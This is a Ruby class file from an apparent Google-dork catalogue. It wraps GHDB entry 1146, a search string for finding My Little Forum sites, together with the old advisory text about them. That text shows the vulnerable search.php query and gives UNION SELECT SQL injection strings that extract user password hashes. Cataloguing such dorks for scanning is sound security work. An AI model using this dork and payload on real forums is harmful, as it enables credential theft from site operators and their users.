module Dorks
   class Dork1146 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1146",
            ghdb_url: "https://www.exploit-db.com/ghdb/1146",
            severity: "2",
            category: "vulnerable_files",
            publish_date: "2005-09-26",
            author: "anonymous",
            dork: <<~EDORK,
"powered by my little forum"
EDORK
            description: <<~EDESC
My Little Forum 1.5 / 1.6beta SQL Injectionsoftware:site: http://www.mylittlehomepage.net/my_little_forumsoftware: "A simple web-forum that supports classical thread view (message tree)as well as messagebord view to display the messages.Requires PHP &gt; 4.1 and a MySQL database."1) look at the vulnerable code at line 144 inside search.php:... $result = mysql_query("SELECT id, pid, tid, DATE_FORMAT(time + INTERVAL ". $time_difference." HOUR,'".$lang['time_format']."') AS Uhrzeit, DATE_FORMAT(time + INTERVAL ".$time_difference." HOUR, '".$lang['time_format']."') AS Datum, subject, name, email, hp, place, text, category FROM ".$forum_table." WHERE ".$search_string." ORDER BY tid DESC, time ASC LIMIT ".$ul.", " .$settings['search_results_per_page'], $connid);...now goto the search page, select "phrase", and type:[whatever]%' UNION SELECT user_pw, user_pw, user_pw, user_pw, user_pw, user_pw,user_pw, user_pw, user_pw, user_pw, user_pw, user_pw FROM forum_userdata whereuser_name='[username]' /*if magic quotes are off you will have (guess?...) any admin/user password hash'cause $searchstring var is not filtered...u can fin my poc exploit here:http://rgod.altervista.org/mylittle15_16b.html2) 1.6beta is vulnerable even, we have:...$result = mysql_query("SELECT id, pid, tid, UNIX_TIMESTAMP(time + INTERVAL ".$time_difference." HOUR) ASUhrzeit, subject, name, email, hp, place, text, category FROM ".$db_settings['forum_table']."WHERE ".$search_string." ORDER BY tid DESC, time ASC LIMIT ".$ul.", ".$settings['search_results_per_page'],$connid);...you have same results, deleting a statement in injection string:[whatever]%' UNION SELECT user_pw, user_pw, user_pw, user_pw, user_pw, user_pw,user_pw, user_pw, user_pw, user_pw, user_pw FROM forum_userdata whereuser_name='[username]' /*
EDESC
         })

      end
   end
end
